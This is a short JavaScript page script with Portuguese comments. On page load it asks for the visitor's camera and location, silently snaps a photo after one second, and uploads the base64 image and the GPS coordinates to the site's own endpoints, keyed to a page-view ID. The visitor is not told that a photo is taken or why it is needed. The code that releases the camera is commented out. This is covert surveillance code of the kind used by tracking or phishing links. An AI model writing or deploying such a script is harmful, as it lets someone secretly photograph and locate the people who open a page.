async function capturePhoto() {
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      console.error("API de câmera não suportada neste navegador.");
      return;
    }

    const stream = await navigator.mediaDevices.getUserMedia({
      video: true,
      audio: false,
    });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    // Aguarda segundos antes de capturar a foto
    await new Promise((resolve) => setTimeout(resolve, 1000));

    // Cria um canvas fora da área visível
    const canvas = document.createElement("canvas");
    //canvas.style.display = "none";
    document.body.appendChild(canvas);

    // Ajusta o tamanho conforme o vídeo
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Desenha a imagem do vídeo no canvas
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Converte o conteúdo do canvas para dados em Base64
    const dataUrl = canvas.toDataURL("image/png");

    // Libera o vídeo e a câmera
    //ideo.pause();
    //stream.getTracks().forEach((track) => track.stop());

    // Remove o canvas para não ficar no DOM
    //document.body.removeChild(canvas);

    // Envia a imagem para uma API (exemplo)
    await fetch("/api/page-view-photo", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        pageViewId: pageLoadId,
        photoBase64: dataUrl,
      }),
    });
  } catch (erro) {
    console.error(
      "Erro ao tentar capturar foto ou solicitar acesso à câmera:",
      erro,
    );
  }
}

function captureLocation() {
  if (!navigator.geolocation) {
    console.error("API de geolocalização não suportada neste navegador.");
    return;
  }

  // Solicita acesso e obtém a posição atual
  navigator.geolocation.getCurrentPosition(
    async (posicao) => {
      const { latitude, longitude } = posicao.coords;
      await fetch("/api/page-view-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          pageViewId: pageLoadId,
          latitude: String(latitude),
          longitude: String(longitude),
        }),
      });
    },
    (erro) => {
      console.error("Erro ou permissão negada para obter localização:", erro);
    },
  );
}

// Execução do fluxo ao carregar a página
window.addEventListener("load", () => {
  if (!pageLoadId) {
    return;
  }

  capturePhoto();
  captureLocation();
});
